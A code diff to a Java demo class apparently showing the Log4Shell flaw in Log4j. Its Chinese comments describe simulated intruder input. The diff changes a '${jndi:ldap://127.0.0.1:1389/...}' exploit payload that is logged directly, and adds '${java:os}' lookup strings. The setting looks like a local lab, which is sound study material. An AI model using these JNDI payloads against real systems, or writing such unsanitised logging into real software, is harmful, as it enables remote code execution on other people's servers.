@@ -46,7 +46,7 @@ public class Log4j {
 
         //用input局部变量来模拟入侵者输入的内容
         // String input = "${jndi:ldap://127.0.0.1:1389/#Exploit}";
-        String input = "${jndi:ldap://127.0.0.1:1389/bud5xf}";
+        String input = "${jndi:ldap://127.0.0.1:1389/gvaeft}";
 
         //这里直接用log4j输入
         logger.error(input);
@@ -54,6 +54,11 @@ public class Log4j {
 
     public static void main(String[] args) {
         log4j_Vuln2();
+
+        String a="${java:os}";
+        logger.error(a);
+        logger.error(a);
+        logger.error(a);
     }
 
 
